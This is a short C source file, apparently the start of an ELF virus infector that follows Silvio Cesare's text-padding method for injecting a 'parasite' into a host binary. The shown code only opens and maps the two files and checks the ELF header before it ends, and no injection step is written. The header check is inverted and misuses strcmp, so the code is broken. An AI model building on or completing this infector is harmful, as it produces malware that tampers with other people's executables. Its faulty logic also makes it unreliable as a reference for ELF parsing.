/* Inject an ELF by using Silvio's Cesare text appending
 * and padding method */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <elf.h>

#define PAGE_SIZE 4096
#define TMP "tmp.bin"

int hfd, pfd;
struct stat hst, pst;

void infect_elf();

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("usage: %s <host> <parasite>\n", argv[0]);
        exit(1);
    }

    if ((hfd = open(argv[1], O_RDONLY)) == -1) 
    {
        perror("host open");
        exit(-1);
    }

    if ((pfd = open(argv[2], O_RDONLY)) == -1)
    {
        perror("parasite open");
        exit(-1);
    }

    if (fstat(hfd, &hst))
    {
        perror("host stat");
        exit(-1);
    }
     
    if (fstat(pfd, &pst))
    {
        perror("parasite stat");
        exit(-1);
    }

    infect_elf();
}

void infect_elf()
{
    
    unsigned char *mem;
    Elf32_Ehdr *e_hdr;
    Elf32_Phdr *p_hdr;
    Elf32_Shdr *s_hdr;

    mem = mmap(NULL, hst.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, hfd, 0);
    if (mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }

    e_hdr = (Elf32_Ehdr *) mem;

    if (!(e_hdr->e_ident[0] == 0x7f && strcmp(&e_hdr->e_ident[1], "ELF")))
    {
        printf("host is not an ELF\n");
        exit(-1);
    }
}

